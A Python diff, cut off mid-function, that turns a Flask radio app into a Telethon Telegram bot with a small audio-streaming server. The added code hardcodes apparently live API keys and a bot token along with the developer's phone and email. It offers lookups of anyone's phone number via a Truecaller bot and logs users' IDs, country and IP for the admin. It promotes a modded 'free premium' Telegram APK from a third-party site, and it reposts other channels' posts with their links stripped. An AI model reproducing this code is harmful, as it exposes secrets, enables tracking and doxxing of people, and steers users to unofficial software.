@@ -1,460 +1,648 @@
-import eventlet
-eventlet.monkey_patch()
+import asyncio
+from datetime import datetime
+import json
+import logging
+import os
+import queue
+import re
+import socket
+import threading
+from flask import Flask, Response, render_template_string, request
+from telethon import Button, TelegramClient, events
+from telethon.errors.rpcerrorlist import FloodWaitError, UserNotParticipantError
+from telethon.tl.functions.channels import GetParticipantRequest
+from telethon.tl.types import (
+    KeyboardButtonWebView,
+    MessageMediaWebPage,
+)
 
-from flask import Flask, render_template_string
-from flask_socketio import SocketIO, emit
+# محاولة استيراد phonenumbers والـ geocoder
+try:
+  import phonenumbers
+  from phonenumbers import geocoder
+except ImportError:
+  phonenumbers = None
+  geocoder = None
 
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!'
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+# =======================================================
+# [ FLASK RADIO SERVER (LOW LATENCY) ]
+# =======================================================
+flask_app = Flask(__name__)
+listeners = []
 
-state = {
-    "is_broadcasting": False,
-    "speak_granted": False,
-    "chat_granted": False,
-    "listener_name": ""
+LISTEN_PAGE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="UTF-8"><title>📻 بث مباشر فوري</title></head>
+<body style="background:#000; color:#fff; text-align:center; padding:50px;">
+    <h1>🔴 جاري البث المباشر الفوري</h1>
+    <audio controls autoplay src="/stream"></audio>
+</body>
+</html>
+"""
+
+HOST_PAGE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="UTF-8"><title>🎙️ لوحة المذيع</title></head>
+<body style="background:#111; color:#fff; text-align:center; padding:50px;">
+    <button onclick="startMic()" style="padding:20px; font-size:20px;">ابدأ البث الفوري</button>
+    <div id="s">الحالة: متوقف</div>
+    <script>
+        let rec;
+        async function startMic() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            rec = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+            rec.ondataavailable = e => fetch('/upload', { method: 'POST', body: e.data });
+            rec.start(50); // إرسال الصوت كل 50ms لتقليل التأخير
+            document.getElementById('s').innerText = 'الحالة: 🔴 يبث الآن';
+        }
+    </script>
+</body>
+</html>
+"""
+
+
+@flask_app.route('/')
+def index():
+  return render_template_string(LISTEN_PAGE)
+
+
+@flask_app.route('/host')
+def host():
+  return render_template_string(HOST_PAGE)
+
+
+@flask_app.route('/upload', methods=['POST'])
+def upload():
+  data = request.data
+  for q in listeners[:]:
+    try:
+      q.put_nowait(data)
+    except:
+      pass
+  return ('', 204)
+
+
+@flask_app.route('/stream')
+def stream():
+  q = queue.Queue(maxsize=10)
+  listeners.append(q)
+
+  def gen():
+    try:
+      while True:
+        yield q.get()
+    finally:
+      listeners.remove(q)
+
+  return Response(gen(), mimetype='audio/webm')
+
+
+def run_flask_server():
+  logging.getLogger('werkzeug').setLevel(logging.ERROR)
+  flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
+
+
+# =======================================================
+# [ CONFIGURATION - الإعدادات والتوكنات ]
+# =======================================================
+API_ID = 35522856
+API_HASH = '8cf9c2d13140fdee3e902d62b6bb987d'
+TOKEN_SYTC_BOT = '8660058763:AAFPQZ2oKw37qRamSRyObLBvfVGsj-0CHoQ'
+WEB_APP_URL = 'https://malekkh860.pythonanywhere.com'
+
+TRUECALLER_BOT = '@TrueCalleRobot'
+ADMIN_ID = 8262756069
+ADMIN_USERNAME = 'almadarsy'
+
+SOURCES = ['@TelevisionSyria', '@syp2day', '@syriaST', '@ShamCashn']
+TARGET_CHANNEL = 'https://t.me/almadaralakbariyasy'
+CHANNEL_USERNAME = 'almadaralakbariyasy'
+
+PREMIUM_URL = (
+    'https://traidmode.com/telegram-premium/get/?urls=https://s1.litemode.org/get/App/Telegram/Telegram-v12.4.3-YalaMod.Com.apk&names=%D8%AA%D8%AD%D9%8D%D9%85%D9%8A%D9%84%20%D8%AA%D9%8D%D9%84%D9%8A%D8%AC%D8%B1%D8%A7%D9%85%20%D8%A7%D9%84%D9%85%D9%8A%D8%B2%20%D8%A7%D9%84%D8%A5%D8%B5%D8%AF%D8%A7%D8%B5%20:%20v12.4.3%20%E2%9A%A1%F0%9F%94%A5%E2%9C%85'
+)
+
+STATE_FILE = 'last_messages.json'
+USERS_FILE = 'bot_users.json'
+
+CUSTOM_RESPONSES = {
+    '+963996131559': (
+        '👑 **معلومات خاصة (رقم المطور):**\n'
+        '👤 **الاسم:** مالك خلوف\n'
+        '📱 **الرقم:** +963996131559\n'
+        '📧 **الإيميل:** malekkh860@gmail.com\n'
+        '💻 **الصفة:** صانع ومطور البوت الرسمي.\n'
+        '🌐 **قناة الهدف:** https://t.me/almadaralakbariyasy'
+    )
 }
 
-listener_html = """
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>محطة مالك خلوف الاذاعية</title>
-    <style>
-        body { font-family: Tahoma, sans-serif; background: #121212; color: #fff; text-align: center; padding-top: 30px; }
-        h1 { color: #f39c12; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
-        .btn { display: block; width: 250px; margin: 15px auto; padding: 15px; border-radius: 10px; border: none; cursor: pointer; font-size: 18px; color: white; }
-        .btn-play { background: #27ae60; font-weight: bold; }
-        .btn-speak { background: #3498db; }
-        .btn-chat { background: #9b59b6; }
-        .btn-end { background: #e74c3c; display: none; }
-        .status { margin-top: 15px; color: #f1c40f; font-weight: bold; font-size: 16px; }
-        
-        #chatBoxContainer { display: none; width: 90%; max-width: 400px; margin: 20px auto; background: #1e1e1e; border-radius: 10px; padding: 15px; border: 1px solid #444; text-align: right; }
-        #chatMessages { height: 150px; overflow-y: scroll; background: #121212; padding: 10px; border-radius: 5px; margin-bottom: 10px; font-size: 14px; }
-        .chat-input-row { display: flex; gap: 5px; }
-        .chat-input-row input { flex: 1; padding: 10px; border-radius: 5px; border: 1px solid #555; background: #2a2a2a; color: #fff; }
-        .chat-input-row button { padding: 10px 15px; background: #2ecc71; border: none; border-radius: 5px; color: white; cursor: pointer; }
+CLIENT_PARAMS = {
+    'connection_retries': None,
+    'retry_delay': 3,
+    'auto_reconnect': True,
+}
 
-        #nameModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 1000; }
-        .modal-box { background: #1e1e1e; padding: 25px; border-radius: 15px; width: 320px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        .modal-box input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #444; background: #2a2a2a; color: #fff; font-size: 16px; text-align: center; }
-        .modal-btn { padding: 10px 20px; margin: 5px; border-radius: 8px; border: none; cursor: pointer; font-size: 16px; color: white; }
-        .btn-send { background: #2ecc71; }
-        .btn-back { background: #e74c3c; }
-    </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-</head>
-<body>
-    <h1>📻 محطة مالك خلوف الاذاعية</h1>
-    
-    <button class="btn btn-play" onclick="startListeningStream()">تشغيل البث الصوتي</button>
+client = TelegramClient('session_user', API_ID, API_HASH, **CLIENT_PARAMS)
+sytc_bot = TelegramClient('session_sytcbot', API_ID, API_HASH, **CLIENT_PARAMS)
 
-    <button id="btnSpeak" class="btn btn-speak" onclick="openModal('speak')">طلب التحدث</button>
-    <button id="btnChat" class="btn btn-chat" onclick="openModal('chat')">طلب المراسلة</button>
-    <button id="btnEnd" class="btn btn-end" onclick="endConversation()">إنهاء المحادثة</button>
-    
-    <div id="status" class="status">الحالة: بانتظار تشغيل البث...</div>
-    <audio id="listenerAudioPlayer" autoplay controls style="display:none; margin: 15px auto;"></audio>
+USER_MODES = {}
 
-    <div id="chatBoxContainer">
-        <div id="chatMessages"></div>
-        <div class="chat-input-row">
-            <input type="text" id="chatInput" placeholder="اكتب رسالتك هنا..." onkeydown="if(event.key==='Enter') sendTextMessage()">
-            <button onclick="sendTextMessage()">إرسال</button>
-        </div>
-    </div>
+# أقفال التزامن
+file_lock = asyncio.Lock()
+truecaller_lock = asyncio.Lock()
 
-    <div id="nameModal">
-        <div class="modal-box">
-            <h3>أدخل اسمك للمتابعة</h3>
-            <input type="text" id="listenerName" placeholder="اكتب اسمك هنا...">
-            <br>
-            <button class="modal-btn btn-send" onclick="confirmRequest()">إرسال</button>
-            <button class="modal-btn btn-back" onclick="closeModal()">رجوع</button>
-        </div>
-    </div>
+# طابور الانتظار لطلبات Truecaller
+truecaller_queue = asyncio.Queue()
 
-    <script>
-        const socket = io();
-        let currentType = '';
-        let mediaRecorder;
-        let audioQueue = [];
-        let isPlayingAudio = false;
+FOOTER_TEXT = (
+    '━━━━━━━━━━━━━━━\n'
+    '📢 **فضلاً الاشتراك بقناتنا لنستمر:** 👉 https://t.me/almadaralakbariyasy\n'
+    f'👑 **صانع البوت:** مالك خلوف (@{ADMIN_USERNAME})'
+)
 
-        function startListeningStream() {
-            const player = document.getElementById('listenerAudioPlayer');
-            player.style.display = 'block';
-            player.play().then(() => {
-                document.getElementById('status').innerText = "تم تفعيل مشغل البث بنجاح 🟢";
-            }).catch(err => {
-                alert("اضغط على تشغيل في مشغل الصوت الظاهر للبدء");
-            });
+WELCOME_TEXT = (
+    '✨ **أهلاً بك بالبوت الخاص بنا!** ✨\n\n'
+    '🔥 **جرب هذه الخدمات الرائعة:**\n'
+    '1️⃣ البحث عن معلومات أي رقم 🔎\n'
+    '2️⃣ الحصول على تلجرام مميز مجاناً 💎\n'
+    '3️⃣ معرفة الدولة ومزود الشبكة الخاص بك 🌍\n'
+    '4️⃣ معرفة إن كان هناك عقوبات على حسابك بتلجرام 🚫\n'
+    '5️⃣ التواصل مع صانع البوت 👨‍💻\n'
+    '6️⃣ البث الإذاعي الصوتي المباشر 📻\n\n'
+    '💡 **صانع البوت:** مالك خلوف\n'
+    f'👤 **اسم المستخدم الخاص بي:** @{ADMIN_USERNAME}\n\n'
+    f'{FOOTER_TEXT}'
+)
+
+
+# =======================================================
+# [ HELPER FUNCTIONS ]
+# =======================================================
+def get_country_name(phone_input: str) -> str:
+  if not phone_input:
+    return 'غير محدد'
+  if phonenumbers and geocoder:
+    try:
+      formatted_input = (
+          phone_input if phone_input.startswith('+') else '+' + phone_input
+      )
+      parsed = phonenumbers.parse(formatted_input, None)
+      c_name = geocoder.description_for_number(parsed, 'ar')
+      if c_name:
+        return c_name
+    except Exception:
+      pass
+  return 'سوريا 🇸🇾' if '+963' in phone_input else 'دولي / غير معروف 🌍'
+
+
+async def notify_admin(
+    sender_id,
+    username,
+    first_name,
+    action_info,
+    country='غير محدد',
+    ip_address=None,
+):
+  if sender_id == ADMIN_ID:
+    return
+
+  user_link = f'[{first_name}](tg://user?id={sender_id})'
+  user_ref = f'@{username}' if username else 'بدون معرف'
+  ip_str = f'\n🌐 **عنوان IP:** `{ip_address}`' if ip_address else ''
+
+  notification_text = (
+      f'🔔 **إشعار استخدام جديد للبوت!**\n\n'
+      f'👤 **المستخدم:** {user_link} ({user_ref})\n'
+      f'🆔 **الآيدي:** `{sender_id}`\n'
+      f'🌍 **الدولة / المنطقة:** {country}{ip_str}\n'
+      f'📌 **الإجراء:** {action_info}\n'
+      f'⏰ **الوقت:** `{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}`'
+  )
+  try:
+    await sytc_bot.send_message(ADMIN_ID, notification_text, parse_mode='md')
+  except Exception:
+    try:
+      await client.send_message(ADMIN_ID, notification_text, parse_mode='md')
+    except Exception as e:
+      print(f'[!] Could not send notification: {e}')
+
+
+async def check_subscription(user_id):
+  try:
+    participant = await sytc_bot(
+        GetParticipantRequest(channel=CHANNEL_USERNAME, participant=user_id)
+    )
+    status = type(participant.participant).__name__
+    if status in [
+        'ChannelParticipantLeft',
+        'ChannelParticipantBanned',
+        'Error',
+    ]:
+      return False
+    return True
+  except UserNotParticipantError:
+    return False
+  except Exception as e:
+    print(f'[!] Subscription check error: {e}')
+    return False
+
+
+def normalize_phone(phone_input: str) -> str:
+  raw = phone_input.strip()
+  cleaned = re.sub(r'[\s\-\(\)]', '', raw)
+  digits_only = re.sub(r'[^\d]', '', cleaned)
+
+  if cleaned.startswith('+'):
+    return cleaned
+  if digits_only.startswith('09') and len(digits_only) == 10:
+    return '+963' + digits_only[1:]
+  return '+' + digits_only
+
+
+def remove_telegram_usernames(text):
+  if not text:
+    return ''
+  pattern = r'https?://(?:t\.me|telegram\.me|telegram\.dog)/(?:televisionsyria|syriast|almadaralakbariyasy)/?|t\.me/(?:televisionsyria|syriast|almadaralakbariyasy)/?'
+  return re.sub(pattern, '', text, flags=re.IGNORECASE).strip()
+
+
+# =======================================================
+# [ ASYNC FILE I/O ]
+# =======================================================
+async def load_state():
+  if os.path.exists(STATE_FILE):
+    try:
+      return await asyncio.to_thread(
+          lambda: json.load(open(STATE_FILE, 'r', encoding='utf-8'))
+      )
+    except Exception:
+      return {}
+  return {}
+
+
+async def save_state(state):
+  async with file_lock:
+
+    def _save():
+      with open(STATE_FILE, 'w', encoding='utf-8') as f:
+        json.dump(state, f, ensure_ascii=False, indent=4)
+
+    await asyncio.to_thread(_save)
+
+
+async def save_bot_user(
+    user_id, username, first_name='', country='غير محدد', ip_address=None
+):
+  async with file_lock:
+
+    def _save():
+      users = {}
+      if os.path.exists(USERS_FILE):
+        try:
+          with open(USERS_FILE, 'r', encoding='utf-8') as f:
+            users = json.load(f)
+        except Exception:
+          users = {}
+
+      str_id = str(user_id)
+      if str_id not in users:
+        users[str_id] = {
+            'user_id': user_id,
+            'username': username,
+            'first_name': first_name,
+            'country': country,
+            'ip': ip_address if ip_address else 'لم يلتقط بعد',
+            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         }
 
-        function openModal(type) {
-            currentType = type;
-            document.getElementById('nameModal').style.display = 'flex';
-        }
+      with open(USERS_FILE, 'w', encoding='utf-8') as f:
+        json.dump(users, f, ensure_ascii=False, indent=4)
 
-        function closeModal() {
-            document.getElementById('nameModal').style.display = 'none';
-            document.getElementById('listenerName').value = '';
-        }
+    await asyncio.to_thread(_save)
 
-        function confirmRequest() {
-            let name = document.getElementById('listenerName').value.trim();
-            if (!name) {
-                alert("الرجاء إدخال الاسم للمتابعة!");
-                return;
-            }
 
-            closeModal();
+def get_main_keyboard():
+  return [
+      [Button.inline('💎 احصل على تلجرام مميز', b'btn_premium')],
+      [Button.inline('🔍 البحث عن معلومات رقم', b'btn_truecaller')],
+      [KeyboardButtonWebView('🌐 كشف عنوان الـ IP ومعلوماتك', WEB_APP_URL)],
+      [
+          Button.url(
+              '🚫 معرفة العقوبات على حسابك بتلجرام',
+              'https://t.me/SpamBot?start=start',
+          )
+      ],
+      [
+          Button.url(
+              '👨‍💻 التواصل مع صانع البوت', f'https://t.me/{ADMIN_USERNAME}'
+          )
+      ],
+  ]
 
-            if (currentType === 'speak') {
-                navigator.mediaDevices.getUserMedia({ audio: true })
-                    .then(stream => {
-                        document.getElementById('status').innerText = "تم إرسال طلب التحدث باسم: " + name;
-                        socket.emit('request_speak', { name: name });
-                        
-                        mediaRecorder = new MediaRecorder(stream);
-                        mediaRecorder.ondataavailable = event => {
-                            if (event.data.size > 0) {
-                                socket.emit('audio_from_listener', event.data);
-                            }
-                        };
-                        mediaRecorder.start(500);
-                    })
-                    .catch(err => {
-                        alert("تعذر الوصول للميكروفون: " + err);
-                    });
-            } else if (currentType === 'chat') {
-                document.getElementById('status').innerText = "تم إرسال طلب المراسلة باسم: " + name;
-                socket.emit('request_chat', { name: name });
-            }
-        }
 
-        function sendTextMessage() {
-            let input = document.getElementById('chatInput');
-            let text = input.value.trim();
-            if (!text) return;
+# =======================================================
+# [ QUEUED TRUECALLER LOGIC ]
+# =======================================================
+async def process_truecaller_queue():
+  while True:
+    phone_number, fut = await truecaller_queue.get()
+    async with truecaller_lock:
+      try:
+        if not client.is_connected():
+          await client.connect()
 
-            appendMessage("أنا: " + text, "#3498db");
-            socket.emit('send_chat_message', { message: text, sender: 'listener' });
-            input.value = '';
-        }
+        loop = asyncio.get_running_loop()
+        handler_fut = loop.create_future()
 
-        function appendMessage(text, color) {
-            let container = document.getElementById('chatMessages');
-            container.innerHTML += `<div style="color: ${color}; margin-bottom: 5px;">${text}</div>`;
-            container.scrollTop = container.scrollHeight;
-        }
+        @client.on(events.MessageEdited(chats=TRUECALLER_BOT))
+        @client.on(events.NewMessage(chats=TRUECALLER_BOT))
+        async def truecaller_handler(event):
+          text = event.message.text or ''
+          if any(
+              w in text.lower()
+              for w in ['searching', 'جاري البحث', 'انتظر', 'loading']
+          ):
+            return
+          if not handler_fut.done():
+            handler_fut.set_result(text)
 
-        function endConversation() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-            }
-            socket.emit('end_conversation');
-        }
+        client.add_event_handler(truecaller_handler)
 
-        socket.on('speak_granted_response', (data) => {
-            if (data.granted) {
-                document.getElementById('status').innerText = "وافق المذيع على طلب التحدث! الصوت مفتوح.";
-                document.getElementById('status').style.color = "#2ecc71";
-                document.getElementById('btnSpeak').style.display = 'none';
-                document.getElementById('btnChat').style.display = 'none';
-                document.getElementById('btnEnd').style.display = 'block';
-            }
-        });
+        try:
+          await client.send_message(TRUECALLER_BOT, phone_number)
+          res = await asyncio.wait_for(handler_fut, timeout=12)
+          fut.set_result(res)
+        except asyncio.TimeoutError:
+          fut.set_result(None)
+        except FloodWaitError as e:
+          await asyncio.sleep(e.seconds)
+          fut.set_result(None)
+        finally:
+          client.remove_event_handler(truecaller_handler)
 
-        socket.on('chat_granted_response', (data) => {
-            if (data.granted) {
-                document.getElementById('status').innerText = "وافق المذيع على المراسلة النصية!";
-                document.getElementById('status').style.color = "#2ecc71";
-                document.getElementById('btnSpeak').style.display = 'none';
-                document.getElementById('btnChat').style.display = 'none';
-                document.getElementById('btnEnd').style.display = 'block';
-                document.getElementById('chatBoxContainer').style.display = 'block';
-            }
-        });
+        await asyncio.sleep(2)
+      except Exception as e:
+        print(f'[!] Truecaller Queue Error: {e}')
+        if not fut.done():
+          fut.set_result(None)
+      finally:
+        truecaller_queue.task_done()
 
-        socket.on('receive_chat_message', (data) => {
-            if (data.sender === 'host') {
-                appendMessage("المذيع: " + data.message, "#e74c3c");
-            }
-        });
 
-        socket.on('receive_audio_from_host', (arrayBuffer) => {
-            const blob = new Blob([arrayBuffer], { type: 'audio/webm' });
-            audioQueue.push(blob);
-            playQueue();
-        });
+async def fetch_truecaller_info_queued(phone_number: str) -> str:
+  loop = asyncio.get_running_loop()
+  fut = loop.create_future()
+  await truecaller_queue.put((phone_number, fut))
+  return await fut
 
-        function playQueue() {
-            if (isPlayingAudio || audioQueue.length === 0) return;
-            isPlayingAudio = true;
-            const blob = audioQueue.shift();
-            const audioUrl = URL.createObjectURL(blob);
-            const player = document.getElementById('listenerAudioPlayer');
-            player.src = audioUrl;
-            player.play().then(() => {
-                player.onended = () => {
-                    isPlayingAudio = false;
-                    playQueue();
-                };
-            }).catch(e => {
-                isPlayingAudio = false;
-                playQueue();
-            });
-        }
 
-        socket.on('conversation_ended', () => {
-            document.getElementById('status').innerText = "تم إنهاء المحادثة.";
-            document.getElementById('status').style.color = "#f1c40f";
-            document.getElementById('btnSpeak').style.display = 'block';
-            document.getElementById('btnChat').style.display = 'block';
-            document.getElementById('btnEnd').style.display = 'none';
-            document.getElementById('chatBoxContainer').style.display = 'none';
-            document.getElementById('chatMessages').innerHTML = '';
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-            }
-        });
-    </script>
-</body>
-</html>
-"""
+# =======================================================
+# [ CATCH-UP LOGIC ]
+# =======================================================
+async def catch_up_missed_messages():
+  print('🔍 جاري فحص الرسائل التي فاتت أثناء توقف البوت...')
+  last_ids = await load_state()
+  for source in SOURCES:
+    try:
+      entity = await client.get_entity(source)
+      source_key = (
+          f'@{entity.username}'
+          if getattr(entity, 'username', None)
+          else str(entity.id)
+      )
+      last_id = last_ids.get(source_key)
 
-host_html = """
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>لوحة المذيع - محطة مالك خلوف</title>
-    <style>
-        body { font-family: Tahoma, sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding-top: 40px; }
-        .btn { display: block; width: 250px; margin: 15px auto; padding: 15px; border-radius: 10px; border: none; cursor: pointer; font-size: 18px; color: white; }
-        .btn-start { background: #27ae60; }
-        .btn-stop { background: #c0392b; }
-        .btn-accept { background: #2980b9; }
-        .btn-end { background: #e74c3c; display: none; margin: 20px auto; }
-        .notification { margin: 15px; font-size: 18px; color: #f39c12; font-weight: bold; }
+      if last_id:
+        async for message in client.iter_messages(
+            entity, min_id=last_id, reverse=True
+        ):
+          original_text = message.text or ''
+          cleaned_text = remove_telegram_usernames(original_text)
+          if original_text and not cleaned_text:
+            cleaned_text = original_text
 
-        #hostChatContainer { display: none; width: 90%; max-width: 400px; margin: 20px auto; background: #222; border-radius: 10px; padding: 15px; border: 1px solid #444; text-align: right; }
-        #hostChatMessages { height: 150px; overflow-y: scroll; background: #121212; padding: 10px; border-radius: 5px; margin-bottom: 10px; font-size: 14px; }
-        .chat-input-row { display: flex; gap: 5px; }
-        .chat-input-row input { flex: 1; padding: 10px; border-radius: 5px; border: 1px solid #555; background: #2a2a2a; color: #fff; }
-        .chat-input-row button { padding: 10px 15px; background: #2ecc71; border: none; border-radius: 5px; color: white; cursor: pointer; }
-    </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-</head>
-<body>
-    <h1>لوحة تحكم المذيع</h1>
-    
-    <div>
-        <button class="btn btn-start" onclick="startBroadcast()">بدء البث الصوتي</button>
-        <button class="btn btn-stop" onclick="stopBroadcast()">إيقاف البث</button>
-    </div>
-    <div id="broadcastStatus" style="margin: 10px; color: #bdc3c7;">حالة البث: متوقف</div>
+          if message.media:
+            if isinstance(message.media, MessageMediaWebPage):
+              await client.send_message(
+                  TARGET_CHANNEL, cleaned_text if cleaned_text else '[رابط]'
+              )
+            else:
+              await client.send_file(
+                  TARGET_CHANNEL,
+                  message.media,
+                  caption=cleaned_text if cleaned_text else None,
+              )
+          elif cleaned_text:
+            await client.send_message(TARGET_CHANNEL, cleaned_text)
 
-    <hr style="border: 0.5px solid #333; width: 80%; margin: 20px auto;">
+          last_ids[source_key] = message.id
+          await save_state(last_ids)
+          await asyncio.sleep(0.5)
+      else:
+        async for message in client.iter_messages(entity, limit=1):
+          last_ids[source_key] = message.id
+          await save_state(last_ids)
+    except Exception as e:
+      print(f'[!] Error during catch-up for {source}: {e}')
+  print('✅ اكتمل استدراك الرسائل الفائتة بنجاح.')
 
-    <div id="notification" class="notification">لا توجد طلبات جديدة حالياً</div>
-    
-    <div id="action_area_speak" style="display:none;">
-        <button class="btn btn-accept" onclick="grantSpeak()">قبول طلب التحدث</button>
-    </div>
 
-    <div id="action_area_chat" style="display:none;">
-        <button class="btn btn-accept" onclick="grantChat()">قبول طلب المراسلة النصية</button>
-    </div>
-    
-    <button id="btnEndHost" class="btn btn-end" onclick="endConversation()">إنهاء المحادثة</button>
-    <audio id="hostAudioPlayer" autoplay controls style="display:none; margin: 15px auto;"></audio>
+# =======================================================
+# [ CORE LOGIC - النشر التلقائي المباشر ]
+# =======================================================
+async def copy_message_telethon(target_chat, message, new_text=None):
+  text_to_use = new_text if new_text is not None else (message.text or '')
 
-    <div id="hostChatContainer">
-        <div id="hostChatMessages"></div>
-        <div class="chat-input-row">
-            <input type="text" id="hostChatInput" placeholder="اكتب رسالتك للمستمع..." onkeydown="if(event.key==='Enter') sendHostTextMessage()">
-            <button onclick="sendHostTextMessage()">إرسال</button>
-        </div>
-    </div>
-
-    <script>
-        const socket = io();
-        let hostMediaRecorder;
-        let hostAudioQueue = [];
-        let isHostPlayingAudio = false;
-
-        function startBroadcast() {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    socket.emit('broadcast_control', { action: 'start' });
-                    
-                    hostMediaRecorder = new MediaRecorder(stream);
-                    hostMediaRecorder.ondataavailable = event => {
-                        if (event.data.size > 0) {
-                            socket.emit('audio_from_host', event.data);
-                        }
-                    };
-                    hostMediaRecorder.start(500);
-                })
-                .catch(err => {
-                    alert("يجب السماح للمتصفح بالوصول للميكروفون لبدء البث: " + err);
-                });
-        }
-
-        function stopBroadcast() {
-            if (hostMediaRecorder && hostMediaRecorder.state !== 'inactive') {
-                hostMediaRecorder.stop();
-            }
-            socket.emit('broadcast_control', { action: 'stop' });
-        }
-
-        function endConversation() {
-            socket.emit('end_conversation');
-        }
-
-        socket.on('broadcast_status', (data) => {
-            let statusText = data.is_running ? "البث يعمل الآن 🟢" : "البث متوقف 🔴";
-            document.getElementById('broadcastStatus').innerText = "حالة البث: " + statusText;
-        });
-
-        socket.on('new_speak_request', (data) => {
-            document.getElementById('notification').innerText = "طلب تحدث من: " + data.name;
-            document.getElementById('action_area_speak').style.display = "block";
-            document.getElementById('action_area_chat').style.display = "none";
-        });
-
-        socket.on('new_chat_request', (data) => {
-            document.getElementById('notification').innerText = "طلب مراسلة من: " + data.name;
-            document.getElementById('action_area_chat').style.display = "block";
-            document.getElementById('action_area_speak').style.display = "none";
-        });
-
-        function grantSpeak() {
-            socket.emit('grant_speak');
-            document.getElementById('notification').innerText = "تم قبول طلب التحدث.";
-            document.getElementById('action_area_speak').style.display = "none";
-            document.getElementById('btnEndHost').style.display = 'block';
-            document.getElementById('hostAudioPlayer').style.display = 'block';
-        }
-
-        function grantChat() {
-            socket.emit('grant_chat');
-            document.getElementById('notification').innerText = "تم قبول طلب المراسلة النصية.";
-            document.getElementById('action_area_chat').style.display = "none";
-            document.getElementById('btnEndHost').style.display = 'block';
-            document.getElementById('hostChatContainer').style.display = 'block';
-        }
-
-        function sendHostTextMessage() {
-            let input = document.getElementById('hostChatInput');
-            let text = input.value.trim();
-            if (!text) return;
-
-            appendHostMessage("أنا (المذيع): " + text, "#e74c3c");
-            socket.emit('send_chat_message', { message: text, sender: 'host' });
-            input.value = '';
-        }
-
-        function appendHostMessage(text, color) {
-            let container = document.getElementById('hostChatMessages');
-            container.innerHTML += `<div style="color: ${color}; margin-bottom: 5px;">${text}</div>`;
-            container.scrollTop = container.scrollHeight;
-        }
-
-        socket.on('receive_chat_message', (data) => {
-            if (data.sender === 'listener') {
-                appendHostMessage("المستمع: " + data.message, "#3498db");
-            }
-        });
-
-        socket.on('receive_audio_from_listener', (arrayBuffer) => {
-            const blob = new Blob([arrayBuffer], { type: 'audio/webm' });
-            hostAudioQueue.push(blob);
-            playHostQueue();
-        });
-
-        function playHostQueue() {
-            if (isHostPlayingAudio || hostAudioQueue.length === 0) return;
-            isHostPlayingAudio = true;
-            const blob = hostAudioQueue.shift();
-            const audioUrl = URL.createObjectURL(blob);
-            const player = document.getElementById('hostAudioPlayer');
-            player.src = audioUrl;
-            player.play().then(() => {
-                player.onended = () => {
-                    isHostPlayingAudio = false;
-                    playHostQueue();
-                };
-            }).catch(e => {
-                isHostPlayingAudio = false;
-                playHostQueue();
-            });
-        }
-
-        socket.on('conversation_ended', () => {
-            document.getElementById('notification').innerText = "تم إنهاء المحادثة.";
-            document.getElementById('action_area_speak').style.display = 'none';
-            document.getElementById('action_area_chat').style.display = 'none';
-            document.getElementById('btnEndHost').style.display = 'none';
-            document.getElementById('hostAudioPlayer').style.display = 'none';
-            document.getElementById('hostChatContainer').style.display = 'none';
-            document.getElementById('hostChatMessages').innerHTML = '';
-        });
-    </script>
-</body>
-</html>
-"""
-
-@app.route('/')
-def listener_panel():
-    return render_template_string(listener_html)
-
-@app.route('/host')
-def host_panel():
-    return render_template_string(host_html)
-
-@socketio.on('broadcast_control')
-def handle_broadcast(data):
-    if data['action'] == 'start':
-        state['is_broadcasting'] = True
+  if message.media:
+    if isinstance(message.media, MessageMediaWebPage):
+      return await client.send_message(
+          target_chat, text_to_use if text_to_use else '[رابط]'
+      )
     else:
-        state['is_broadcasting'] = False
-    emit('broadcast_status', {'is_running': state['is_broadcasting']}, broadcast=True)
+      return await client.send_file(
+          target_chat,
+          message.media,
+          caption=text_to_use if text_to_use else None,
+      )
+  elif text_to_use:
+    return await client.send_message(target_chat, text_to_use)
 
-@socketio.on('request_speak')
-def handle_speak_req(data):
-    state['listener_name'] = data.get('name', 'مستمع مجهول')
-    emit('new_speak_request', {'name': state['listener_name']}, broadcast=True)
 
-@socketio.on('request_chat')
-def handle_chat_req(data):
-    name = data.get('name', 'مستمع مجهول')
-    emit('new_chat_request', {'name': name}, broadcast=True)
+@client.on(events.NewMessage(chats=SOURCES))
+async def copy_logic(event):
+  try:
+    original_text = event.message.text or ''
+    cleaned_text = remove_telegram_usernames(original_text)
+    if original_text and not cleaned_text:
+      cleaned_text = original_text
 
-@socketio.on('grant_speak')
-def handle_grant():
-    state['speak_granted'] = True
-    emit('speak_granted_response', {'granted': True}, broadcast=True)
+    await copy_message_telethon(TARGET_CHANNEL, event.message, cleaned_text)
 
-@socketio.on('grant_chat')
-def handle_grant_chat():
-    state['chat_granted'] = True
-    emit('chat_granted_response', {'granted': True}, broadcast=True)
+    source_key = (
+        f'@{event.chat.username}' if event.chat.username else str(event.chat_id)
+    )
+    last_ids = await load_state()
+    last_ids[source_key] = event.message.id
+    await save_state(last_ids)
+  except Exception as e:
+    print(f'[!] Error copying message: {e}')
 
-@socketio.on('send_chat_message')
-def handle_chat_message(data):
-    emit('receive_chat_message', data, broadcast=True, include_self=False)
 
-@socketio.on('audio_from_listener')
-def handle_listener_audio(audio_data):
